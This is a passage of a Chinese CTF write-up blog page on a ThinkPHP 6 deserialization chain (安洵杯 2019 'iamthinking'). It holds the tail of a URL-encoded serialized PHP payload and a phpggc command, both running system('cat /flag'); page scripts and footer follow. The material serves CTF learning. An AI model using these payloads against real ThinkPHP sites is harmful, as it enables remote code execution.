class="hljs-number">22</span>cat+%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">21</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>withAttr%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>key%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>data%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>key%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cat+%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">21</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>withAttr%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>key%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D <br></code></pre></td></tr></table></figure>
+
+<p>简易解 用<a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/phpggc">phpgcc</a>直接生成payload </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./phpggc -u ThinkPHP/RCE2 &#x27;system(&quot;cat /flag&quot;);&#x27;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/160791504">https://zhuanlan.zhihu.com/p/160791504</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/105777872">https://blog.csdn.net/qq_42181428/article/details/105777872</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              <p class="note note-warning">
+                <strong>本文作者: </strong><a href="/">D3n13d</a> <br>
+                <strong>本文链接: </strong><a href="https://d3n13d.github.io/2022/02/24/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019-iamthinking-TP6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/">https://d3n13d.github.io/2022/02/24/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019-iamthinking-TP6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/</a> <br>
+                <strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                   </p>
+                   
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/02/18/BUUCTF-web-%E7%AC%AC%E4%BA%94%E9%A1%B5wp/">
+                        <span class="hidden-mobile">BUUCTF_web_第五页wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'preferred-color-scheme';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'D3n13d/utterances');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202110012686.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:120px; height:120px;">
+  <br>
+  <center> # 曾记否，到中流击水，浪遏飞舟？ </center>
+<footer class="text-center mt-5 py-3">
+
+  
+  <div class="footer-content">
+    <div>
+      <span id="timeDate">载入天数...</span>
+      <span id="times">载入时分秒...</span>
+      <script>
+      var now = new Date();
+      function createtime(){
+          var grt= new Date("01/07/2022 00:00:00");//此处修改你的建站时间或者网站上线时间
+          now.setTime(now.getTime()+250);
+          days = (now - grt ) / 1000 / 60 / 60 / 24;
+          dnum = Math.floor(days);
+          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+          hnum = Math.floor(hours);
+          if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+          }
+          minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+          mnum = Math.floor(minutes);
+          if(String(mnum).length ==1 ){
+                    mnum = "0" + mnum;
+          }
+          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+          snum = Math.round(seconds);
+          if(String(snum).length ==1 ){
+                    snum = "0" + snum;
+          }
+          
+          document.getElementById("timeDate").innerHTML = "🚀 &nbsp;"+dnum+"&nbsp天";  //此次自定义显示内容
+          document.getElementById("times").innerHTML = hnum + "&nbsp小时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+      }  //此次自定义显示内容
+      setInterval("createtime()",250);
+      </script>
+    </div>
+  </div>
+
+  
+  
+    <!-- 不蒜子统计 -->
+    
+      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span >本站总访问量：
+            <span id="busuanzi_value_site_pv"></span>次</span>
+    
+    
+    
+    
+    
+    
+  <div>©2022<a href="https://d3n13d.github.io/">&nbsp;&nbsp;D3n13d 的快乐小屋</a></div>
+
+  
+</footer>
+
+
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":80})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script>
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
